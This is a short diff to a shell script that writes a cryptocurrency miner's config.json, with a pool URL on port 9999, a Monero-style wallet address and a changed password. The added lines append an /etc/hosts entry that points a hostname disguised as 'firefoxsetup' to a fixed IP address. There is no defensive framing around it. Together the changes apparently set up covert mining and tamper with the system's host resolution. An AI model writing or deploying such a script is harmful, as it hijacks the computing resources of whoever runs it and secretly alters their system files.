@@ -81,7 +81,7 @@ bash -c 'cat <<EOT >>config.json
             "coin": null,
               "url": "$firefoxsetup.$link:9999",
             "user": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjXYC8xTdYSfScBAJ",
-            "pass": "shell2",
+            "pass": "sv105",
             "rig-id": null,
             "nicehash": false,
             "keepalive": false,
@@ -121,4 +121,8 @@ bash -c 'cat <<EOT >>config.json
 }
 EOT
 '
-
+#!/bin/sh
+bash -c 'cat <<EOT >>/etc/hosts
+161.97.166.105      $firefoxsetup.$link
+EOT
+'
